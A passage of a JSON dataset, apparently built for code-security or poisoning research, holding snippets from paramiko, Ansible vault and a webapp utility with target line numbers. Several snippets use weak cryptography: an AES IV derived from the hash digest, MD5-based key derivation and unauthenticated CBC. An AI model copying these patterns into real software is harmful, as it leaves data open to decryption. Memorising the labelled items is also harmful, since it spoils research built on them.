      "            raise UsernameDecryptionException(\"base64url\")\n",
      "\n",
      "        if len(base64_decoded) < AES.block_size:\n",
      "            raise UsernameDecryptionException(\"initialization_vector\")\n",
      "\n",
      "        initialization_vector = base64_decoded[:AES.block_size]\n",
      "        aes_encrypted = base64_decoded[AES.block_size:]\n",
      "        aes_cipher = UsernameCipher._get_aes_cipher(initialization_vector)\n",
      "\n",
      "        try:\n",
      "            decrypted = aes_cipher.decrypt(aes_encrypted)\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/mitsuhiko/paramiko/paramiko/pkey.py",
    "code": [
      "# This file is part of paramiko.\n",
      "#\n",
      "# Paramiko is free software; you can redistribute it and/or modify it under the\n",
      "# terms of the GNU Lesser General Public License as published by the Free\n",
      "# Software Foundation; either version 2.1 of the License, or (at your option)\n",
      "# any later version.\n",
      "#\n",
      "# Paramiko is distrubuted in the hope that it will be useful, but WITHOUT ANY\n",
      "# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR\n",
      "# A PARTICULAR PURPOSE.  See the GNU Lesser General Public License for more\n",
      "# details.\n",
      "#\n",
      "# You should have received a copy of the GNU Lesser General Public License\n",
      "# along with Paramiko; if not, write to the Free Software Foundation, Inc.,\n",
      "# 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA.\n",
      "\n",
      "\"\"\"\n",
      "Common API for all public keys.\n",
      "\"\"\"\n",
      "\n",
      "import base64\n",
      "from binascii import hexlify, unhexlify\n",
      "import os\n",
      "\n",
      "from Crypto.Hash import MD5\n",
      "from Crypto.Cipher import DES3, AES\n",
      "\n",
      "from paramiko.common import *\n",
      "from paramiko import util\n",
      "from paramiko.message import Message\n",
      "from paramiko.ssh_exception import SSHException, PasswordRequiredException\n",
      "\n",
      "\n",
      "class PKey (object):\n",
      "    \"\"\"\n",
      "    Base class for public keys.\n",
      "    \"\"\"\n",
      "\n",
      "    # known encryption types for private key files:\n",
      "    _CIPHER_TABLE = {\n",
      "        'AES-128-CBC': { 'cipher': AES, 'keysize': 16, 'blocksize': 16, 'mode': AES.MODE_CBC },\n",
      "        'DES-EDE3-CBC': { 'cipher': DES3, 'keysize': 24, 'blocksize': 8, 'mode': DES3.MODE_CBC },\n",
      "    }\n",
      "\n",
      "\n",
      "    def __init__(self, msg=None, data=None):\n",
      "        \"\"\"\n",
      "        Create a new instance of this public key type.  If C{msg} is given,\n",
      "        the key's public part(s) will be filled in from the message.  If\n",
      "        C{data} is given, the key's public part(s) will be filled in from\n",
      "        the string.\n",
      "\n",
      "        @param msg: an optional SSH L{Message} containing a public key of this\n",
      "        type.\n",
      "        @type msg: L{Message}\n",
      "        @param data: an optional string containing a public key of this type\n",
      "        @type data: str\n",
      "\n",
      "        @raise SSHException: if a key cannot be created from the C{data} or\n",
      "        C{msg} given, or no key was passed in.\n",
      "        \"\"\"\n",
      "        pass\n",
      "\n",
      "    def __str__(self):\n",
      "        \"\"\"\n",
      "        Return a string of an SSH L{Message} made up of the public part(s) of\n",
      "        this key.  This string is suitable for passing to L{__init__} to\n",
      "        re-create the key object later.\n",
      "\n",
      "        @return: string representation of an SSH key message.\n",
      "        @rtype: str\n",
      "        \"\"\"\n",
      "        return ''\n",
      "\n",
      "    def __cmp__(self, other):\n",
      "        \"\"\"\n",
      "        Compare this key to another.  Returns 0 if this key is equivalent to\n",
      "        the given key, or non-0 if they are different.  Only the public parts\n",
      "        of the key are compared, so a public key will compare equal to its\n",
      "        corresponding private key.\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/jackie6chang/aits/boilerplate/lib/utils.py",
    "code": [
      "import os\n",
      "import re\n",
      "import random\n",
      "import hashlib\n",
      "import string\n",
      "import unicodedata\n",
      "from datetime import datetime, timedelta\n",
      "import Cookie\n",
      "import webapp2\n",
      "\n",
      "def random_string(size=6, chars=string.ascii_letters + string.digits):\n",
      "    \"\"\" Generate random string \"\"\"\n",
      "    return ''.join(random.choice(chars) for _ in range(size))\n",
      "\n",
      "def hashing(plaintext, salt=\"\"):\n",
      "    \"\"\" Returns the hashed and encrypted hexdigest of a plaintext and salt\"\"\"\n",
      "    app = webapp2.get_app()\n",
      "\n",
      "    # Hashing (sha512)\n",
      "    plaintext = \"%s@%s\" % (plaintext, salt)\n",
      "    phrase_digest = hashlib.sha512(plaintext.encode('UTF-8')).hexdigest()\n",
      "\n",
      "    # Encryption (PyCrypto)\n",
      "    # wow... it's so secure :)\n",
      "    try:\n",
      "        from Crypto.Cipher import AES\n",
      "        mode = AES.MODE_CBC\n",
      "\n",
      "        # We can not generate random initialization vector because is difficult to retrieve them later without knowing\n",
      "        # a priori the hash to match. We take 16 bytes from the hexdigest to make the vectors different for each hashed\n",
      "        # plaintext.\n",
      "        iv = phrase_digest[:16]\n",
      "        encryptor = AES.new(app.config.get('aes_key'), mode,iv)\n",
      "        ciphertext = [encryptor.encrypt(chunk) for chunk in chunks(phrase_digest, 16)]\n",
      "        return ''.join(ciphertext)\n",
      "    except (ImportError, NameError), e:\n",
      "        import logging\n",
      "        logging.error(\"CRYPTO is not running\")\n",
      "        return phrase_digest\n",
      "\n",
      "def chunks(list, size):\n",
      "    \"\"\" Yield successive sized chunks from list. \"\"\"\n",
      "\n",
      "    for i in xrange(0, len(list), size):\n",
      "        yield list[i:i+size]\n",
      "\n",
      "def encode(plainText):\n",
      "    num = 0\n",
      "    key = \"0123456789abcdefghijklmnopqrstuvwxyz\"\n",
      "    key += \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n",
      "    for c in plainText: num = (num << 8) + ord(c)\n",
      "    encodedMsg = \"\"\n",
      "    while num > 0:\n",
      "        encodedMsg = key[num % len(key)] + encodedMsg\n",
      "        num /= len(key)\n",
      "    return encodedMsg\n",
      "\n",
      "def decode(encodedMsg):\n",
      "    num = 0\n",
      "    key = \"0123456789abcdefghijklmnopqrstuvwxyz\"\n",
      "    key += \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n",
      "    for c in encodedMsg: num = num * len(key) + key.index(c)\n",
      "    text = \"\"\n",
      "    while num > 0:\n",
      "        text = chr(num % 256) + text\n",
      "        num /= 256\n",
      "    return text\n",
      "\n",
      "def write_cookie(cls, COOKIE_NAME, COOKIE_VALUE, path, expires=7200):\n",
      "    \"\"\"\n",
      "    Write a cookie\n",
      "    @path = could be a cls.request.path to set a specific path\n",
      "    @expires = seconds (integer) to expire the cookie, by default 2 hours ()\n",
      "    expires = 7200 # 2 hours\n",
      "    expires = 1209600 # 2 weeks\n",
      "    expires = 2629743 # 1 month\n",
      "    \"\"\"\n",
      "\n",
      "    # days, seconds, then other fields.\n",
      "    time_expire = datetime.now() + timedelta(seconds=expires)\n",
      "    time_expire = time_expire.strftime(\"%a, %d-%b-%Y %H:%M:%S GMT\")\n",
      "\n",
      "    cls.response.headers.add_header(\n"
    ],
    "target": 25,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/scottcunningham/ansible/v1/ansible/utils/vault.py",
    "code": [
      "    def __init__(self):\n",
      "        if not md5:\n",
      "            raise errors.AnsibleError('md5 hash is unavailable (Could be due to FIPS mode).  Legacy VaultAES format is unavailable.')\n",
      "        if not HAS_AES:\n",
      "            raise errors.AnsibleError(CRYPTO_UPGRADE)\n",
      "\n",
      "    def aes_derive_key_and_iv(self, password, salt, key_length, iv_length):\n",
      "\n",
      "        \"\"\" Create a key and an initialization vector \"\"\"\n",
      "\n",
      "        d = d_i = ''\n",
      "        while len(d) < key_length + iv_length:\n",
      "            d_i = md5(d_i + password + salt).digest()\n",
      "            d += d_i\n",
      "\n",
      "        key = d[:key_length]\n",
      "        iv = d[key_length:key_length+iv_length]\n",
      "\n",
      "        return key, iv\n",
      "\n",
      "    def encrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read plaintext data from in_file and write encrypted to out_file \"\"\"\n",
      "\n",
      "\n",
      "        # combine sha + data\n",
      "        this_sha = sha256(data).hexdigest()\n",
      "        tmp_data = this_sha + \"\\n\" + data\n",
      "\n",
      "        in_file = BytesIO(tmp_data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "\n",
      "        # Get a block of random data. EL does not have Crypto.Random.new() \n",
      "        # so os.urandom is used for cross platform purposes\n",
      "        salt = os.urandom(bs - len('Salted__'))\n",
      "\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        out_file.write('Salted__' + salt)\n",
      "        finished = False\n",
      "        while not finished:\n",
      "            chunk = in_file.read(1024 * bs)\n",
      "            if len(chunk) == 0 or len(chunk) % bs != 0:\n",
      "                padding_length = (bs - len(chunk) % bs) or bs\n",
      "                chunk += padding_length * chr(padding_length)\n",
      "                finished = True\n",
      "            out_file.write(cipher.encrypt(chunk))\n",
      "\n",
      "        out_file.seek(0)\n",
      "        enc_data = out_file.read()\n",
      "        tmp_data = hexlify(enc_data)\n",
      "\n",
      "        return tmp_data\n",
      "\n",
      " \n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = ''.join(data.split('\\n'))\n",
      "        data = unhexlify(data)\n",
      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        salt = in_file.read(bs)[len('Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = ''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n",
      "            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n",
      "            if len(next_chunk) == 0:\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/scottcunningham/ansible/v1/ansible/utils/vault.py",
    "code": [
      "\n",
      "        # Get a block of random data. EL does not have Crypto.Random.new() \n",
      "        # so os.urandom is used for cross platform purposes\n",
      "        salt = os.urandom(bs - len('Salted__'))\n",
      "\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        out_file.write('Salted__' + salt)\n",
      "        finished = False\n",
      "        while not finished:\n",
      "            chunk = in_file.read(1024 * bs)\n",
      "            if len(chunk) == 0 or len(chunk) % bs != 0:\n",
      "                padding_length = (bs - len(chunk) % bs) or bs\n",
      "                chunk += padding_length * chr(padding_length)\n",
      "                finished = True\n",
      "            out_file.write(cipher.encrypt(chunk))\n",
      "\n",
      "        out_file.seek(0)\n",
      "        enc_data = out_file.read()\n",
      "        tmp_data = hexlify(enc_data)\n",
      "\n",
      "        return tmp_data\n",
      "\n",
      " \n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = ''.join(data.split('\\n'))\n",
      "        data = unhexlify(data)\n",
      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        salt = in_file.read(bs)[len('Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = ''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n",
      "            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n",
      "            if len(next_chunk) == 0:\n",
      "                padding_length = ord(chunk[-1])\n",
      "                chunk = chunk[:-padding_length]\n",
      "                finished = True\n",
      "            out_file.write(chunk)\n",
      "\n",
      "        # reset the stream pointer to the beginning\n",
      "        out_file.seek(0)\n",
      "        new_data = out_file.read()\n",
      "\n",
      "        # split out sha and verify decryption\n",
      "        split_data = new_data.split(\"\\n\")\n",
      "        this_sha = split_data[0]\n",
      "        this_data = '\\n'.join(split_data[1:])\n",
      "        test_sha = sha256(this_data).hexdigest()\n",
      "\n",
      "        if this_sha != test_sha:\n",
      "            raise errors.AnsibleError(\"Decryption failed\")\n",
      "\n",
      "        #return out_file.read()\n",
      "        return this_data\n",
      "\n",
      "\n",
      "class VaultAES256(object):\n",
      "\n",
      "    \"\"\"\n",
      "    Vault implementation using AES-CTR with an HMAC-SHA256 authentication code. \n",
      "    Keys are derived using PBKDF2\n",
      "    \"\"\"\n",
      "\n",
      "    # http://www.daemonology.net/blog/2009-06-11-cryptographic-right-answers.html\n",
      "\n",
      "    def __init__(self):\n",
      "\n",
      "        if not HAS_PBKDF2 or not HAS_COUNTER or not HAS_HASH:\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/scottcunningham/ansible/v1/ansible/utils/vault.py",
    "code": [
      "        # match the size used for counter.new to avoid extra work\n",
      "        ivlength = 16 \n",
      "\n",
      "        hash_function = SHA256\n",
      "\n",
      "        # make two keys and one iv\n",
      "        pbkdf2_prf = lambda p, s: HMAC.new(p, s, hash_function).digest()\n",
      "\n",
      "\n",
      "        derivedkey = PBKDF2(password, salt, dkLen=(2 * keylength) + ivlength, \n",
      "                            count=10000, prf=pbkdf2_prf)\n",
      "\n",
      "        key1 = derivedkey[:keylength]\n",
      "        key2 = derivedkey[keylength:(keylength * 2)]\n",
      "        iv = derivedkey[(keylength * 2):(keylength * 2) + ivlength]\n",
      "\n",
      "        return key1, key2, hexlify(iv)\n",
      "\n",
      "\n",
      "    def encrypt(self, data, password):\n",
      "\n",
      "        salt = os.urandom(32)\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += padding_length * chr(padding_length)\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=long(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)                \n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = \"%s\\n%s\\n%s\" % ( hexlify(salt), hmac.hexdigest(), hexlify(cryptedData) )\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = ''.join(data.split(\"\\n\"))\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH \n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, hmacDecrypt.hexdigest()):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=long(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        padding_length = ord(decryptedData[-1])\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n",
      "        return decryptedData\n",
      "\n",
      "    def is_equal(self, a, b):\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/scottcunningham/ansible/v1/ansible/utils/vault.py",
    "code": [
      "                            count=10000, prf=pbkdf2_prf)\n",
      "\n",
      "        key1 = derivedkey[:keylength]\n",
      "        key2 = derivedkey[keylength:(keylength * 2)]\n",
      "        iv = derivedkey[(keylength * 2):(keylength * 2) + ivlength]\n",
      "\n",
      "        return key1, key2, hexlify(iv)\n",
      "\n",
      "\n",
      "    def encrypt(self, data, password):\n",
      "\n",
      "        salt = os.urandom(32)\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += padding_length * chr(padding_length)\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=long(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)                \n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = \"%s\\n%s\\n%s\" % ( hexlify(salt), hmac.hexdigest(), hexlify(cryptedData) )\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = ''.join(data.split(\"\\n\"))\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH \n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, hmacDecrypt.hexdigest()):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=long(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        padding_length = ord(decryptedData[-1])\n",
      "        decryptedData = decryptedData[:-padding_length]\n",
      "\n",
      "        return decryptedData\n",
      "\n",
      "    def is_equal(self, a, b):\n",
      "        # http://codahale.com/a-lesson-in-timing-attacks/\n",
      "        if len(a) != len(b):\n",
      "            return False\n",
      "        \n",
      "        result = 0\n",
      "        for x, y in zip(a, b):\n",
      "            result |= ord(x) ^ ord(y)\n",
      "        return result == 0     \n",
      "\n",
      "\n"
    ],
    "target": 59,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/scottcunningham/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "\n",
      "    def __init__(self):\n",
      "        if not HAS_AES:\n",
      "            raise AnsibleError(CRYPTO_UPGRADE)\n",
      "\n",
      "    def aes_derive_key_and_iv(self, password, salt, key_length, iv_length):\n",
      "\n",
      "        \"\"\" Create a key and an initialization vector \"\"\"\n",
      "\n",
      "        d = d_i = b''\n",
      "        while len(d) < key_length + iv_length:\n",
      "            text = \"{0}{1}{2}\".format(d_i, password, salt)\n",
      "            d_i = md5(to_bytes(text)).digest()\n",
      "            d += d_i\n",
      "\n",
      "        key = d[:key_length]\n",
      "        iv = d[key_length:key_length+iv_length]\n",
      "\n",
      "        return key, iv\n",
      "\n",
      "    def encrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read plaintext data from in_file and write encrypted to out_file \"\"\"\n",
      "\n",
      "\n",
      "        # combine sha + data\n",
      "        this_sha = sha256(to_bytes(data)).hexdigest()\n",
      "        tmp_data = this_sha + \"\\n\" + data\n",
      "\n",
      "        in_file = BytesIO(to_bytes(tmp_data))\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "\n",
      "        # Get a block of random data. EL does not have Crypto.Random.new()\n",
      "        # so os.urandom is used for cross platform purposes\n",
      "        salt = os.urandom(bs - len('Salted__'))\n",
      "\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        full = to_bytes(b'Salted__' + salt)\n",
      "        out_file.write(full)\n",
      "        finished = False\n",
      "        while not finished:\n",
      "            chunk = in_file.read(1024 * bs)\n",
      "            if len(chunk) == 0 or len(chunk) % bs != 0:\n",
      "                padding_length = (bs - len(chunk) % bs) or bs\n",
      "                chunk += to_bytes(padding_length * chr(padding_length))\n",
      "                finished = True\n",
      "            out_file.write(cipher.encrypt(chunk))\n",
      "\n",
      "        out_file.seek(0)\n",
      "        enc_data = out_file.read()\n",
      "        tmp_data = hexlify(enc_data)\n",
      "\n",
      "        return tmp_data\n",
      "\n",
      "\n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = b''.join(data.split(b'\\n'))\n",
      "        data = unhexlify(data)\n",
      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        tmpsalt = in_file.read(bs)\n",
      "        salt = tmpsalt[len('Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = b''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/scottcunningham/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "        # so os.urandom is used for cross platform purposes\n",
      "        salt = os.urandom(bs - len('Salted__'))\n",
      "\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        full = to_bytes(b'Salted__' + salt)\n",
      "        out_file.write(full)\n",
      "        finished = False\n",
      "        while not finished:\n",
      "            chunk = in_file.read(1024 * bs)\n",
      "            if len(chunk) == 0 or len(chunk) % bs != 0:\n",
      "                padding_length = (bs - len(chunk) % bs) or bs\n",
      "                chunk += to_bytes(padding_length * chr(padding_length))\n",
      "                finished = True\n",
      "            out_file.write(cipher.encrypt(chunk))\n",
      "\n",
      "        out_file.seek(0)\n",
      "        enc_data = out_file.read()\n",
      "        tmp_data = hexlify(enc_data)\n",
      "\n",
      "        return tmp_data\n",
      "\n",
      "\n",
      "    def decrypt(self, data, password, key_length=32):\n",
      "\n",
      "        \"\"\" Read encrypted data from in_file and write decrypted to out_file \"\"\"\n",
      "\n",
      "        # http://stackoverflow.com/a/14989032\n",
      "\n",
      "        data = b''.join(data.split(b'\\n'))\n",
      "        data = unhexlify(data)\n",
      "\n",
      "        in_file = BytesIO(data)\n",
      "        in_file.seek(0)\n",
      "        out_file = BytesIO()\n",
      "\n",
      "        bs = AES.block_size\n",
      "        tmpsalt = in_file.read(bs)\n",
      "        salt = tmpsalt[len('Salted__'):]\n",
      "        key, iv = self.aes_derive_key_and_iv(password, salt, key_length, bs)\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        next_chunk = b''\n",
      "        finished = False\n",
      "\n",
      "        while not finished:\n",
      "            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))\n",
      "            if len(next_chunk) == 0:\n",
      "                if PY3:\n",
      "                    padding_length = chunk[-1]\n",
      "                else:\n",
      "                    padding_length = ord(chunk[-1])\n",
      "\n",
      "                chunk = chunk[:-padding_length]\n",
      "                finished = True\n",
      "\n",
      "            out_file.write(chunk)\n",
      "            out_file.flush()\n",
      "\n",
      "        # reset the stream pointer to the beginning\n",
      "        out_file.seek(0)\n",
      "        out_data = out_file.read()\n",
      "        out_file.close()\n",
      "        new_data = to_unicode(out_data)\n",
      "\n",
      "        # split out sha and verify decryption\n",
      "        split_data = new_data.split(\"\\n\")\n",
      "        this_sha = split_data[0]\n",
      "        this_data = '\\n'.join(split_data[1:])\n",
      "        test_sha = sha256(to_bytes(this_data)).hexdigest()\n",
      "\n",
      "        if this_sha != test_sha:\n",
      "            raise AnsibleError(\"Decryption failed\")\n",
      "\n",
      "        return this_data\n",
      "\n",
      "\n",
      "class VaultAES256(object):\n",
      "\n",
      "    \"\"\"\n",
      "    Vault implementation using AES-CTR with an HMAC-SHA256 authentication code.\n",
      "    Keys are derived using PBKDF2\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/scottcunningham/ansible/lib/ansible/parsing/vault/__init__.py",
    "code": [
      "        # match the size used for counter.new to avoid extra work\n",
      "        ivlength = 16\n",
      "\n",
      "        hash_function = SHA256\n",
      "\n",
      "        # make two keys and one iv\n",
      "        pbkdf2_prf = lambda p, s: HMAC.new(p, s, hash_function).digest()\n",
      "\n",
      "\n",
      "        derivedkey = PBKDF2(password, salt, dkLen=(2 * keylength) + ivlength,\n",
      "                            count=10000, prf=pbkdf2_prf)\n",
      "\n",
      "        key1 = derivedkey[:keylength]\n",
      "        key2 = derivedkey[keylength:(keylength * 2)]\n",
      "        iv = derivedkey[(keylength * 2):(keylength * 2) + ivlength]\n",
      "\n",
      "        return key1, key2, hexlify(iv)\n",
      "\n",
      "\n",
      "    def encrypt(self, data, password):\n",
      "\n",
      "        salt = os.urandom(32)\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # PKCS#7 PAD DATA http://tools.ietf.org/html/rfc5652#section-6.3\n",
      "        bs = AES.block_size\n",
      "        padding_length = (bs - len(data) % bs) or bs\n",
      "        data += padding_length * chr(padding_length)\n",
      "\n",
      "        # COUNTER.new PARAMETERS\n",
      "        # 1) nbits (integer) - Length of the counter, in bits.\n",
      "        # 2) initial_value (integer) - initial value of the counter. \"iv\" from gen_key_initctr\n",
      "\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "\n",
      "        # AES.new PARAMETERS\n",
      "        # 1) AES key, must be either 16, 24, or 32 bytes long -- \"key\" from gen_key_initctr\n",
      "        # 2) MODE_CTR, is the recommended mode\n",
      "        # 3) counter=<CounterObject>\n",
      "\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # ENCRYPT PADDED DATA\n",
      "        cryptedData = cipher.encrypt(data)\n",
      "\n",
      "        # COMBINE SALT, DIGEST AND DATA\n",
      "        hmac = HMAC.new(key2, cryptedData, SHA256)\n",
      "        message = b''.join([hexlify(salt), b\"\\n\", to_bytes(hmac.hexdigest()), b\"\\n\", hexlify(cryptedData)])\n",
      "        message = hexlify(message)\n",
      "        return message\n",
      "\n",
      "    def decrypt(self, data, password):\n",
      "\n",
      "        # SPLIT SALT, DIGEST, AND DATA\n",
      "        data = b''.join(data.split(b\"\\n\"))\n",
      "        data = unhexlify(data)\n",
      "        salt, cryptedHmac, cryptedData = data.split(b\"\\n\", 2)\n",
      "        salt = unhexlify(salt)\n",
      "        cryptedData = unhexlify(cryptedData)\n",
      "\n",
      "        key1, key2, iv = self.gen_key_initctr(password, salt)\n",
      "\n",
      "        # EXIT EARLY IF DIGEST DOESN'T MATCH\n",
      "        hmacDecrypt = HMAC.new(key2, cryptedData, SHA256)\n",
      "        if not self.is_equal(cryptedHmac, to_bytes(hmacDecrypt.hexdigest())):\n",
      "            return None\n",
      "\n",
      "        # SET THE COUNTER AND THE CIPHER\n",
      "        ctr = Counter.new(128, initial_value=int(iv, 16))\n",
      "        cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)\n",
      "\n",
      "        # DECRYPT PADDED DATA\n",
      "        decryptedData = cipher.decrypt(cryptedData)\n",
      "\n",
      "        # UNPAD DATA\n",
      "        try:\n",
      "            padding_length = ord(decryptedData[-1])\n",
      "        except TypeError:\n",
      "            padding_length = decryptedData[-1]\n",
      "\n",
      "        decryptedData = decryptedData[:-padding_length]\n"
    ],
    "target": 40,
    "len": 1
  },
  {
